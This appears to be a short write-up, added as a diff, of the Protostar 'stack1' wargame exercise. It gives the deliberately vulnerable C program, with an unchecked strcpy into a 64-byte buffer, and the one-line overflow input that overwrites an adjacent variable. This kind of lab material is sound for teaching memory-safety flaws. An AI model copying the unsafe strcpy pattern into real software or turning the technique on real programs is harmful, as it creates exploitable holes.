@@ -1,0 +1,36 @@
+/opt/protostar/bin/stack1
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+      errx(1, "please specify an argument\n");
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+      printf("you have correctly got the variable to the right value\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+}
+
+
+A very similiar task to the first one. Instead of reading input with gets this time we have to provide a string as a program parameter. Also this time it's not only changing value but setting it to the arbitrary chosen value.
+
+Just a quick chek in gdb - buffer and modified variable at the same exact adresses, so nothing really changed. Every byte over 64 will override 'modified' value.
+
+The value 0x61626364 contains four writable characters a, b, c, d (you can look it up in ascii table). We only have to remember about little endian notation, which means that we need to input bytes in reversed order. This time instead of using pipe ('|') to redirect an output from python command we can use backticks to execute command as a parameter. 
+
+Our solution can look like this:
+> ./stack1 `python -c "print('A'*64 + 'dcba')"`
+> you have correctly got the variable to the right value
